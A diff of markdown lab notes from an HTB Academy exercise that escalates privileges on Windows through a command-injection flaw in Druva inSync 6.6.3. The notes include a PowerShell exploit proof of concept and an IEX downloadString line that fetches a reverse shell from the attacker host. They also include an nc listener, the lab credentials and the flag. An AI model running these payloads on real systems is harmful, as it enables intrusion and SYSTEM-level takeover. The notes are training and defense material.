@@ -1,4 +1,4 @@
-# Vulnerable Services Privilege Escalation
+# ⚡ Vulnerable Services
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔍 Third-Party Software Enumeration
 
 ### Installed Programs Discovery
+
 ```cmd
 # Enumerate installed applications
 wmic product get name
@@ -20,6 +21,7 @@ Microsoft Update Health Tools
 ```
 
 ### Service Process Mapping
+
 ```cmd
 # Check for running services on specific ports
 netstat -ano | findstr 6064
@@ -37,6 +39,7 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 ## 💥 Druva inSync 6.6.3 Exploitation
 
 ### Vulnerability Details
+
 ```cmd
 # CVE Information:
 - Application: Druva inSync Client (backup/eDiscovery)
@@ -48,6 +51,7 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 ```
 
 ### PowerShell Exploit PoC
+
 ```powershell
 # Basic command injection template
 $ErrorActionPreference = "Stop"
@@ -75,16 +79,18 @@ $s.Send($command)
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
-- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
-- **Access Method**: xfreerdp
-- **Vulnerable Service**: Druva inSync 6.6.3 (running on port 6064)
-- **Flag Location**: `C:\Users\Administrator\Desktop\VulServices\flag.txt`
-- **Flag**: `Aud1t_th0se_th1rd_paRty_s3rvices!`
+
+* **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
+* **Credentials**: `htb-student:HTB_@cademy_stdnt!`
+* **Access Method**: xfreerdp
+* **Vulnerable Service**: Druva inSync 6.6.3 (running on port 6064)
+* **Flag Location**: `C:\Users\Administrator\Desktop\VulServices\flag.txt`
+* **Flag**: `Aud1t_th0se_th1rd_paRty_s3rvices!`
 
 ### Detailed Walkthrough
 
 #### 1. Connect via RDP
+
 ```bash
 # Connect to target using xfreerdp
 xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!
@@ -97,6 +103,7 @@ xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 #### 2. Enumerate Druva inSync Service
+
 ```powershell
 # Open PowerShell and find process listening on port 6064
 netstat -ano | findstr 6064
@@ -126,6 +133,7 @@ Running  inSyncCPHService   Druva inSync Client Service
 ```
 
 #### 3. Prepare Attack Infrastructure on Pwnbox
+
 ```bash
 # Download Invoke-PowerShellTcp.ps1 from GitHub and rename to shell.ps1
 # Add this line at the bottom of shell.ps1:
@@ -139,6 +147,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 
 #### 4. Configure Druva Exploit Script
+
 ```powershell
 # On Windows target, use File Explorer to navigate to C:\Tools
 # Edit Druva.ps1 script with Notepad
@@ -150,6 +159,7 @@ $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14
 ```
 
 #### 5. Start Netcat Listener on Pwnbox
+
 ```bash
 # Start listener on same port as specified in shell.ps1
 nc -lvnp 9443
@@ -161,6 +171,7 @@ Ncat: Listening on 0.0.0.0:9443
 ```
 
 #### 6. Execute Druva Exploit
+
 ```powershell
 # On Windows target, navigate to C:\Tools in PowerShell
 cd C:\Tools
@@ -176,6 +187,7 @@ cd C:\Tools
 ```
 
 #### 7. Receive SYSTEM Shell
+
 ```bash
 # On Pwnbox nc listener, you should receive connection:
 Ncat: Connection from 10.129.43.44.
@@ -187,6 +199,7 @@ PS C:\WINDOWS\system32>
 ```
 
 #### 8. Access Flag
+
 ```powershell
 # Verify SYSTEM privileges and access flag
 whoami
@@ -201,6 +214,7 @@ type C:\Users\Administrator\Desktop\VulServices\flag.txt
 ## 🔄 Additional Vulnerable Services
 
 ### Common Third-Party Targets
+
 ```cmd
 # High-risk applications often found in enterprise:
 - Backup software (Druva, Veeam, etc.)
@@ -212,6 +226,7 @@ type C:\Users\Administrator\Desktop\VulServices\flag.txt
 ```
 
 ### Service Discovery Methodology
+
 ```cmd
 # 1. Software enumeration
 wmic product get name
@@ -232,6 +247,7 @@ Get-Process | Where-Object {$_.ProcessName -notlike "System*"}
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Unusual network connections to localhost high ports
@@ -241,6 +257,7 @@ Get-Process | Where-Object {$_.ProcessName -notlike "System*"}
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security hardening:
 - Restrict local administrator rights
@@ -260,6 +277,6 @@ Get-Process | Where-Object {$_.ProcessName -notlike "System*"}
 5. **PowerShell payloads** effective for fileless exploitation
 6. **Application whitelisting** essential defensive measure
 
----
+***
 
-*Vulnerable services exploitation highlights the importance of comprehensive software inventory and patch management in enterprise environments.*
+_Vulnerable services exploitation highlights the importance of comprehensive software inventory and patch management in enterprise environments._
